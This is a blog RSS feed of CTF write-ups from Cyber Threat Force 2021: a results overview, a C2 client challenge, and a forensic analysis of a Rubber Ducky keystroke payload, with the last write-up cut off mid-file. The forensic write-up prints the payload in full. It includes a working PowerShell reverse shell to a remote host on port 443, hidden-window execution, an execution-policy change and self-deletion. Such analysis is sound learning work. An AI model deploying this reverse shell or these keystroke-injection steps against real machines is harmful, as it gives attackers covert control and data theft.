<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>About me on Nicolas Bourras</title><link>https://nicolasb.fr/</link><description>Recent content in About me on Nicolas Bourras</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 11 Jul 2021 10:12:19 +0100</lastBuildDate><atom:link href="https://nicolasb.fr/index.xml" rel="self" type="application/rss+xml"/><item><title>Cyber Threat Force (CTF)</title><link>https://nicolasb.fr/blog/cyber-threat-force-ctf/</link><pubDate>Sun, 11 Jul 2021 10:12:19 +0100</pubDate><guid>https://nicolasb.fr/blog/cyber-threat-force-ctf/</guid><description>This was a short CTF (48h), a format that I like since it doesn&amp;rsquo;t eat up too much of my time. I enjoyed it with my friends: Lukho, R0ck3t and Volker. We registered a team on CTFTime: Root Root.
We ranked 4th out of 197 teams, scoring 6935 points. And I personnaly ranked 6th, scoring 3775 points and completing 19 challenges!
Here are the challenges that I completed or spent time on, with links to my writeups:</description><content>&lt;p>This was a short CTF (48h), a format that I like since it doesn&amp;rsquo;t eat up too much of my time. I enjoyed it with my friends: &lt;a href="https://twitter.com/lukhooo">Lukho&lt;/a>, &lt;a href="https://ctftime.org/user/46515">R0ck3t&lt;/a> and &lt;a href="https://twitter.com/volker_carstein">Volker&lt;/a>. We registered a team on CTFTime: &lt;a href="https://ctftime.org/team/157632">Root Root&lt;/a>.&lt;/p>
&lt;p>We ranked 4th out of 197 teams, scoring 6935 points. And I personnaly ranked 6th, scoring 3775 points and completing 19 challenges!&lt;/p>
&lt;p>Here are the challenges that I completed or spent time on, with links to my writeups:&lt;/p>
&lt;ul>
&lt;li>Pwn
&lt;ul>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-privesc/">PrivEsc&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/">Bof 1&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/#level-2-getshell">Bof 1 GetShell&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-1/#level-3-privesc">Bof 1 PrivEsc&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/">Bof 2&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-2/#level-2-privesc">Bof 2 PrivEsc&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-pwn-bof-3/">Bof 3&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Reverse
&lt;ul>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-take-your-time/">Take your time&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-flag-checker/">Flag checker&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/">Verify this&lt;/a> (almost solved)&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/">Smasher&lt;/a> (flagged by &lt;a href="https://ctftime.org/user/46515">R0ck3t&lt;/a>)&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/">The document is strange&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-viking-crypt/">Viking crypt&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-trojan-tools/">Trojan tools&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Crypto
&lt;ul>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-administration-service/">Strange administration service&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-strange-service/">Strange service&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-crypto-unefficient-encryption/">(Un)Efficient encryption&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Forensic
&lt;ul>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/">Welcome to the matrix&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/">Usb key cemetery&lt;/a> (flagged by &lt;a href="https://twitter.com/volker_carstein">Volker&lt;/a>)&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/">Like a duck in water&lt;/a> (flagged by &lt;a href="https://twitter.com/lukhooo">Lukho&lt;/a>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Steganography
&lt;ul>
&lt;li>Strange file&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Discord
&lt;ul>
&lt;li>Discord as a C2&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Misc
&lt;ul>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-return-to-the-school/">Return to the school&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/">Azkaban C2&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>I think I improved quite a bit compared to my previous CTF, but I&amp;rsquo;m still not good enough at binary exploitation and reverse engineering ; I should have been a lot quicker for many challenges. That would have meant more time to discover the lab, which I didn&amp;rsquo;t really have time for. Guess I&amp;rsquo;ll go back to root-me for now!&lt;/p>
&lt;h2 id="links">Links&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://cyberthreatforce-ctf.com/index.html">Official website&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ctftime.org/event/1380">CTFTime event&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/vivescere/ctf">My repo with the sources&lt;/a>&lt;/li>
&lt;li>Other writeups that I found:
&lt;ul>
&lt;li>&lt;a href="https://github.com/AetherBlack/CyberThreatForce2021">AetherBlack&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://qiita.com/mikecat_mixc/items/c8ce09f484b81480e5ae">MikeCAT&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@Electro/CyberThreatForce-2021">Electro&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ctftime.org/writeup/29113">Amendil&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/W0rty/WU-CyberThreatForce/">W0rty&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@ZIHK9sOKRKWawlEr3aTZYw/Byb0w5y6_">UVision&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/cieran/writeups/tree/main/CyberThreatForceCTF">Cieran&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hanasuru.medium.com/how-we-found-unintended-bypass-to-exploiting-entire-cyberthreatforce-discord-server-d93951b9efab">Avilia&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://gist.github.com/lightdiscord/d8b087c469b65f67f0762bfee2d48320">LightDiscord&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="screenshots">Screenshots&lt;/h2>
&lt;p>The teams scoreboard:
&lt;a href="https://nicolasb.fr/assets/cyber-threat-force/scoreboard-teams.png">&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/scoreboard-teams.png" alt="The scoreboard showing the top teams">&lt;/a>&lt;/p>
&lt;p>The players scoreboard:
&lt;a href="https://nicolasb.fr/assets/cyber-threat-force/scoreboard-individuals.png">&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/scoreboard-individuals.png" alt="The scoreboard showing the top players">&lt;/a>&lt;/p>
&lt;p>My CTFd profile:
&lt;a href="https://nicolasb.fr/assets/cyber-threat-force/profile.png">&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/profile.png" alt="My CTFd profile showing the challenges I completed">&lt;/a>&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Azkaban C2</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/</link><pubDate>Sun, 11 Jul 2021 09:45:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/</guid><description>For this challenge, we were given a python script:
import socket def menu(): print(&amp;#34;______________________&amp;#34;) print(&amp;#34;| MENU |&amp;#34;) print(&amp;#34;| 1) see option |&amp;#34;) print(&amp;#34;| 2) edit option |&amp;#34;) print(&amp;#34;| 3) connect |&amp;#34;) print(&amp;#34;______________________&amp;#34;) print(&amp;#34;&amp;#34;&amp;#34; ______ __ __ ______ / \ / | / | / \ /$$$$$$ | ________ $$ | __ ______ $$ |____ ______ _______ _______ /$$$$$$ | $$ |__$$ |/ |$$ | / | / \ $$ \ / \ / \ / |$$____$$ | $$ $$ |$$$$$$$$/ $$ |_/$$/ $$$$$$ |$$$$$$$ | $$$$$$ |$$$$$$$ | /$$$$$$$/ / $$/ $$$$$$$$ | / $$/ $$ $$&amp;lt; / $$ |$$ | $$ | / $$ |$$ | $$ | $$ | /$$$$$$/ $$ | $$ | /$$$$/__ $$$$$$ \ /$$$$$$$ |$$ |__$$ |/$$$$$$$ |$$ | $$ | $$ \_____ $$ |_____ $$ | $$ |/$$ |$$ | $$ |$$ $$ |$$ $$/ $$ $$ |$$ | $$ | $$ |$$ | $$/ $$/ $$$$$$$$/ $$/ $$/ $$$$$$$/ $$$$$$$/ $$$$$$$/ $$/ $$/ $$$$$$$/ $$$$$$$$/ -----=[Azkaban C2 v.</description><content>&lt;p>For this challenge, we were given a python script:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> socket
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">menu&lt;/span>():
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;______________________&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;| MENU |&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;| 1) see option |&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;| 2) edit option |&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;| 3) connect |&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;______________________&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;span style="color:#e6db74">
&lt;/span>&lt;span style="color:#e6db74"> ______ __ __ ______
&lt;/span>&lt;span style="color:#e6db74"> / \ / | / | / \
&lt;/span>&lt;span style="color:#e6db74">/$$$$$$ | ________ $$ | __ ______ $$ |____ ______ _______ _______ /$$$$$$ |
&lt;/span>&lt;span style="color:#e6db74">$$ |__$$ |/ |$$ | / | / \ $$ \ / \ / \ / |$$____$$ |
&lt;/span>&lt;span style="color:#e6db74">$$ $$ |$$$$$$$$/ $$ |_/$$/ $$$$$$ |$$$$$$$ | $$$$$$ |$$$$$$$ | /$$$$$$$/ / $$/
&lt;/span>&lt;span style="color:#e6db74">$$$$$$$$ | / $$/ $$ $$&amp;lt; / $$ |$$ | $$ | / $$ |$$ | $$ | $$ | /$$$$$$/
&lt;/span>&lt;span style="color:#e6db74">$$ | $$ | /$$$$/__ $$$$$$ \ /$$$$$$$ |$$ |__$$ |/$$$$$$$ |$$ | $$ | $$ \_____ $$ |_____
&lt;/span>&lt;span style="color:#e6db74">$$ | $$ |/$$ |$$ | $$ |$$ $$ |$$ $$/ $$ $$ |$$ | $$ | $$ |$$ |
&lt;/span>&lt;span style="color:#e6db74">$$/ $$/ $$$$$$$$/ $$/ $$/ $$$$$$$/ $$$$$$$/ $$$$$$$/ $$/ $$/ $$$$$$$/ $$$$$$$$/
&lt;/span>&lt;span style="color:#e6db74">
&lt;/span>&lt;span style="color:#e6db74">-----=[Azkaban C2 v.0.0.1 alpha]
&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">see_option&lt;/span>():
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;_________________________________&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;| PIN CODE : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pin_code &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; |&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;| Team Serveur IP : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> teamserver_ip &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;|&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;| Team Serveur Port : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> teamserver_port &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34; |&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;_________________________________&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">edit_option&lt;/span>():
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Current option :&amp;#34;&lt;/span>)
see_option()
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Where option you want to edit ?&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34; 1) PIN_CODE&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">2) TeamServer IP &lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">3) TeamServer Port &amp;#34;&lt;/span>)
choix &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Azk-c2 &amp;gt; &amp;#34;&lt;/span>)
choix &lt;span style="color:#f92672">=&lt;/span> str(choix)
&lt;span style="color:#66d9ef">while&lt;/span> (True):
&lt;span style="color:#66d9ef">if&lt;/span> choix &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>:
pin_code &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Azk-c2 | Edit PIN_CODE &amp;gt; &amp;#34;&lt;/span>)
pin_code &lt;span style="color:#f92672">=&lt;/span> str(pin_code)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+]PIN_CODE : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pin_code)
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">elif&lt;/span> choix &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>:
teamserver_ip &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Azk-c2 | Edit TeamServer IP &amp;gt; &amp;#34;&lt;/span>)
teamserver_ip &lt;span style="color:#f92672">=&lt;/span> str(teamserver_ip)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+]TeamServer IP : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> teamserver_ip)
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">elif&lt;/span> choix &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;3&amp;#34;&lt;/span>:
teamserver_port &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Azk-c2 | Edit TeamServer Port &amp;gt; &amp;#34;&lt;/span>)
teamserver_port &lt;span style="color:#f92672">=&lt;/span> str(teamserver_port)
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;[+]TeamServer Port : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> teamserver_port)
&lt;span style="color:#66d9ef">break&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Error&amp;#34;&lt;/span>)
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">connect&lt;/span>(pin_code, teamserver_ip, teamserver_port):
teamserver_port &lt;span style="color:#f92672">=&lt;/span> int(teamserver_port)
clientSocket &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>socket(socket&lt;span style="color:#f92672">.&lt;/span>AF_INET, socket&lt;span style="color:#f92672">.&lt;/span>SOCK_STREAM);
clientSocket&lt;span style="color:#f92672">.&lt;/span>connect((teamserver_ip,teamserver_port));
clientSocket&lt;span style="color:#f92672">.&lt;/span>send(pin_code&lt;span style="color:#f92672">.&lt;/span>encode());
dataFromServer &lt;span style="color:#f92672">=&lt;/span> clientSocket&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">1024&lt;/span>);
&lt;span style="color:#66d9ef">print&lt;/span>(dataFromServer&lt;span style="color:#f92672">.&lt;/span>decode());
res &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Azk-c2 &amp;gt; &amp;#34;&lt;/span>)
res &lt;span style="color:#f92672">=&lt;/span> str(res)
clientSocket&lt;span style="color:#f92672">.&lt;/span>send(res&lt;span style="color:#f92672">.&lt;/span>encode());
dataFromServer &lt;span style="color:#f92672">=&lt;/span> clientSocket&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">1024&lt;/span>);
&lt;span style="color:#66d9ef">print&lt;/span>(dataFromServer&lt;span style="color:#f92672">.&lt;/span>decode());
&lt;span style="color:#66d9ef">while&lt;/span> (True):
menu()
pin_code &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;4785&amp;#34;&lt;/span>
teamserver_ip &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;144.217.73.235&amp;#34;&lt;/span>
teamserver_port &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;26007&amp;#34;&lt;/span>
choix &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Azk-c2 &amp;gt; &amp;#34;&lt;/span>)
choix &lt;span style="color:#f92672">=&lt;/span> str(choix)
&lt;span style="color:#66d9ef">if&lt;/span> choix &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1&amp;#34;&lt;/span>:
see_option()
&lt;span style="color:#66d9ef">elif&lt;/span> choix &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>:
edit_option()
&lt;span style="color:#66d9ef">elif&lt;/span> choix &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;3&amp;#34;&lt;/span>:
connect(pin_code, teamserver_ip, teamserver_port)
&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Bad choice, try again&amp;#34;&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>At the end, we can see an IP, a port, and a PIN. Upon connecting to the service using netcat, it asked us the result of a simple addition. After that, we had to enter the pin (4785), and select an option. Option 2, &amp;ldquo;Dump creds&amp;rdquo;, printed out the flag.&lt;/p>
&lt;p>I unfortunately am writting this after the server was shutdown, so I can&amp;rsquo;t include a demo.&lt;/p>
&lt;p>The flag is &lt;code>CYBERTF{0wn_th3_t3ams3rv3r}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/misc/azkaban-c2">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Like a duck in water</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/</link><pubDate>Sun, 11 Jul 2021 09:24:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/</guid><description>Note: I did not solve this challenge during the CTF, but my teammate Lukho did.
For this challenge, we were given an inject.bin file, which contains an encoded Rubber Ducky payload. We can use the Duck Toolkit to get back the original code:
DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER DELAY mDELAY DOWNARROW ... DOWNARROW ENTER $folderDateTime = (get-date).ToString(&amp;#39;d-M-y HHmmss&amp;#39;)ENTER ... Add-Content &amp;#34;$env:TEMP\72794.ps1&amp;#34; &amp;#39;$c = New-Object System.Net.Sockets.TCPClient(&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;,443);$s = $c.</description><content>&lt;p>Note: I did not solve this challenge during the CTF, but my teammate &lt;a href="https://twitter.com/lukhooo">Lukho&lt;/a> did.&lt;/p>
&lt;p>For this challenge, we were given an &lt;code>inject.bin&lt;/code> file, which contains an encoded &lt;a href="https://hak5.org/products/usb-rubber-ducky-deluxe">Rubber Ducky&lt;/a> payload. We can use the &lt;a href="https://ducktoolkit.com/encode">Duck Toolkit&lt;/a> to get back the original code:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-text" data-lang="text">DELAY
DELAY
powershell Start-Process notepad -Verb runAsENTER
DELAY
DELAY
ENTER
DELAY
mDELAY
DOWNARROW
...
DOWNARROW
ENTER
$folderDateTime = (get-date).ToString(&amp;#39;d-M-y HHmmss&amp;#39;)ENTER
...
Add-Content &amp;#34;$env:TEMP\72794.ps1&amp;#34; &amp;#39;$c = New-Object System.Net.Sockets.TCPClient(&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;,443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String );$sb2 = $sb + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&amp;#39;ENTER
start-Process powershell.exe -windowstyle hidden &amp;#34;$env:TEMP\72794.ps1&amp;#34;ENTER
$Report &amp;gt;&amp;gt; $fileSaveDir&amp;#39;/ComputerInfo.html&amp;#39;ENTER
function copy-ToZip($fileSaveDir){ENTER
$srcdir = $fileSaveDirENTER
$zipFile = &amp;#39;C:\Windows\Temp\report.txt\Report.zip&amp;#39;ENTER
if(-not (test-path($zipFile))) {ENTER
set-content $zipFile (&amp;#34;PK&amp;#34; + [char]5 + [char]6 + (&amp;#34;$([char]0)&amp;#34; * 18))ENTER
(dir $zipFile).IsReadOnly = $false}ENTER
$shellApplication = new-object -com shell.applicationENTER
$zipPackage = $shellApplication.NameSpace($zipFile)ENTER
$files = Get-ChildItem -Path $srcdirENTER
foreach($file in $files) {ENTER
$zipPackage.CopyHere($file.FullName)ENTER
while($zipPackage.Items().Item($file.name) -eq $null){ENTER
Start-sleep -seconds 1 }}}ENTER
copy-ToZip($fileSaveDir)ENTER
remove-item $fileSaveDir -recurseENTER
Remove-Item $MyINvocation.InvocationNameENTER
DELAY
C:\Windows\config-72794.ps1ENTER
DELAY
DELAY
DELAY
powershell Start-Process cmd -Verb runAsENTER
DELAY
DELAY
mode con:cols=14 lines=1ENTER
DELAY
mDELAY
DOWNARROW
...
DOWNARROW
ENTER
powershell Set-ExecutionPolicy &amp;#39;Unrestricted&amp;#39; -Scope CurrentUser -Confirm:$falseENTER
DELAY
powershell.exe -windowstyle hidden -File C:\Windows\config-72794.ps1ENTER
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see that last powershell command, which launches a file that was previously written. The content of that file is:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-powershell" data-lang="powershell">$c = New-Object System.Net.Sockets.TCPClient(&lt;span style="color:#e6db74">&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;&lt;/span>,443);$s = $c.GetStream();&lt;span style="color:#66d9ef">[byte[]]&lt;/span>$b = 0..255|%{0};&lt;span style="color:#66d9ef">while&lt;/span>(($i = $s.Read($b, 0, $b.Length)) &lt;span style="color:#f92672">-ne&lt;/span> 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String );$sb2 = $sb + &lt;span style="color:#e6db74">&amp;#34;PS &amp;#34;&lt;/span> + (pwd).Path + &lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>;$sby = (&lt;span style="color:#66d9ef">[text.encoding]&lt;/span>::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{D0N4LD_DUC|&amp;lt;}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/like-a-duck-in-water">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Usb key cemetery</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/</link><pubDate>Sun, 11 Jul 2021 09:09:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/</guid><description>Note: I did not solve this challenge during the CTF, but my teammate Volker did.
For this challenge, we were given a zip containing an encoded syslog (sysloc.enc), and an auth.json file:
{ &amp;#34;manufact&amp;#34;: [ &amp;#34;Apple Inc.&amp;#34;, &amp;#34;Azurewave&amp;#34;, &amp;#34;Generic&amp;#34;, &amp;#34;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#34;, &amp;#34;usbrip-4381&amp;#34; ], &amp;#34;pid&amp;#34;: [ &amp;#34;0002&amp;#34;, &amp;#34;0003&amp;#34;, &amp;#34;0129&amp;#34;, &amp;#34;0608&amp;#34;, &amp;#34;12a8&amp;#34;, &amp;#34;3491&amp;#34;, &amp;#34;56dd&amp;#34;, &amp;#34;usbrip-4381&amp;#34; ], &amp;#34;prod&amp;#34;: [ &amp;#34;USB2.0 HD UVC WebCam&amp;#34;, &amp;#34;USB2.0 Hub&amp;#34;, &amp;#34;USB2.0-CRW&amp;#34;, &amp;#34;iPhone&amp;#34;, &amp;#34;usbrip-4381&amp;#34;, &amp;#34;xHCI Host Controller&amp;#34; ], &amp;#34;serial&amp;#34;: [ &amp;#34;0000:03:00.</description><content>&lt;p>Note: I did not solve this challenge during the CTF, but my teammate &lt;a href="https://twitter.com/volker_carstein">Volker&lt;/a> did.&lt;/p>
&lt;p>For this challenge, we were given a zip containing an encoded syslog (&lt;code>sysloc.enc&lt;/code>), and an &lt;code>auth.json&lt;/code> file:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;manufact&amp;#34;&lt;/span>: [
&lt;span style="color:#e6db74">&amp;#34;Apple Inc.&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;Azurewave&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;Generic&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#34;&lt;/span>,
&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
],
